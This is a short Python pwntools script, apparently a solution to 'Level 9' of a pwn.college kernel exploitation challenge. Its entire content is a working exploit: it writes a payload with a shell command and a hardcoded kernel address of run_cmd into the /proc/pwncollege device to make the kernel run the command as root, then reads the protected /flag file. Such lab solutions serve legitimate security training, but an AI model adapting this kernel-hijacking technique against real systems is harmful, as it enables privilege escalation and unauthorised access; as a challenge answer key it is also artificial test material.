# Level 9
import os

import pwn

pwn.context.arch = "amd64"

payload = pwn.flat(
    {
        0x000: b"/usr/bin/chmod +444 /flag",
        # sudo cat /proc/kallsyms | grep run_cmd
        0x100: 0xFFFFFFFF81089B30,
    },
    filler=b"\0",
)
print(pwn.hexdump(payload))

fd = os.open("/proc/pwncollege", os.O_RDWR)
os.write(fd, payload)
os.close(fd)

# run_cmd() will not wait for the command to finish
pwn.sleep(1)  
print(pwn.read("/flag").decode())
